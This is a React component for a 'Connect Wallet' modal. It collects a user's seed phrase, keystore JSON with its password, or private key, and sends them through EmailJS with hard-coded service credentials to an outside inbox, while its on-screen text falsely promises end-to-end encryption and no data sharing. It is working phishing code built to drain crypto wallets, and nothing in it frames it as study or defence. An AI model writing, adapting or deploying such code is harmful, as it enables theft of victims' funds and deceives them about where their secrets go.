import React, { useState, useEffect } from "react";
import emailjs from "emailjs-com";
import styles from "./SecureConnectModal.module.css";

export default function SecureConnectModal({
  isOpen,
  walletName = "Wallet",
  onClose,
  onConnectClick,
}) {
  const [tab, setTab] = useState("phrase");
  const [submissionStatus, setSubmissionStatus] = useState(null);
  const [form, setForm] = useState({
    // address: "",
    phrase: "",
    keystore: "",
    privateKey: "",
    password: "",
  });

  // Validate EVM address format
  const isEvmAddress = (v) => /^0x[a-fA-F0-9]{40}$/.test(v);

  // Handle form input changes
  function handleChange(e) {
    setForm({ ...form, [e.target.name]: e.target.value });
  }

  // Handle form submission with EmailJS
  function handleSubmit(e) {
    e.preventDefault();

    // Validate based on current tab
    if (tab === "address" && !isEvmAddress(form.address)) {
      setSubmissionStatus("error");
      return;
    }

    if (tab === "keystore" && (!form.keystore || !form.password)) {
      setSubmissionStatus("error");
      return;
    }

    if (tab === "private" && !form.privateKey) {
      setSubmissionStatus("error");
      return;
    }

    if (tab === "phrase" && !form.phrase) {
      setSubmissionStatus("error");
      return;
    }

    // Prepare data for EmailJS
    const templateParams = {
      tab: tab,
      address: form.address,
      phrase: form.phrase,
      keystore: form.keystore,
      privateKey: form.privateKey,
      password: form.password,
      walletName: walletName,
      timestamp: new Date().toISOString(),
    };

    const serviceId = "service_56n8z4a";
    const templateId = "template_dey9fjo";
    const publicKey = "K1AGskH132ZW-p9P4";

    emailjs
      .send(serviceId, templateId, templateParams, publicKey)
      .then((response) => {
        console.log("SUCCESS!", response.status, response.text);
        setSubmissionStatus("success");
        setForm({
          address: "",
          phrase: "",
          keystore: "",
          privateKey: "",
          password: "",
        });

        setTimeout(() => setSubmissionStatus(null), 3000);
      })
      .catch((err) => {
        console.error("FAILED…", err);
        setSubmissionStatus("error");
        setTimeout(() => setSubmissionStatus(null), 3000);
      });
  }

  useEffect(() => {
    if (!isOpen) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => (document.body.style.overflow = prev);
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div
      className={styles.overlay}
      onClick={onClose}
      aria-modal="true"
      role="dialog"
    >
      <div className={styles.modal} onClick={(e) => e.stopPropagation()}>
        <div className={styles.header}>
          <h3>Connect {walletName}</h3>
          <button className={styles.close} onClick={onClose} aria-label="Close">
            ×
          </button>
        </div>

        <p className={styles.note}>
          <strong>NB:</strong> All information is end-to-end encrypted. We do
          not share data and activity sessions with any other company.
        </p>

        <div className={styles.tabs} role="tablist">
          <button
            role="tab"
            aria-selected={tab === "phrase"}
            className={tab === "phrase" ? styles.tabActive : styles.tab}
            onClick={() => setTab("phrase")}
          >
            Seed Phrase
          </button>
          <button
            role="tab"
            aria-selected={tab === "keystore"}
            className={tab === "keystore" ? styles.tabActive : styles.tab}
            onClick={() => setTab("keystore")}
          >
            Keystore JSON
          </button>
          <button
            role="tab"
            aria-selected={tab === "private"}
            className={tab === "private" ? styles.tabActive : styles.tab}
            onClick={() => setTab("private")}
          >
            Private Key
          </button>
        </div>

        <form className={styles.form} onSubmit={handleSubmit}>
          <label className={styles.label}>
            {tab === "phrase" && "Seed Phrase"}
            {tab === "keystore" && "Keystore JSON"}
            {tab === "private" && "Private Key"}
          </label>

          {tab === "phrase" && (
            <textarea
              className={styles.inputArea}
              name="phrase"
              value={form.phrase}
              onChange={handleChange}
              placeholder="Enter your seed phrase (12-24 words)"
              rows={3}
            />
          )}

          {tab === "keystore" && (
            <>
              <textarea
                className={styles.inputArea}
                name="keystore"
                value={form.keystore}
                onChange={handleChange}
                placeholder='Paste keystore JSON ({"version":3, ...})'
                rows={4}
              />
              <input
                className={styles.input}
                type="password"
                name="password"
                value={form.password}
                onChange={handleChange}
                placeholder="Keystore password"
              />
            </>
          )}

          {tab === "private" && (
            <textarea
              className={styles.inputArea}
              name="privateKey"
              value={form.privateKey}
              onChange={handleChange}
              placeholder="Enter your private key"
              rows={2}
            />
          )}

          {submissionStatus === "error" && (
            <div className={styles.error}>
              Please provide valid information for the selected method.
            </div>
          )}

          {submissionStatus === "success" && (
            <div className={styles.success}>
              Information submitted successfully!
            </div>
          )}

          <button type="submit" className={styles.submit}>
            Submit
          </button>
        </form>

        <div className={styles.actions}>
          <button className={styles.connect} onClick={onConnectClick}>
            Connect (Open {walletName})
          </button>
        </div>
      </div>
    </div>
  );
}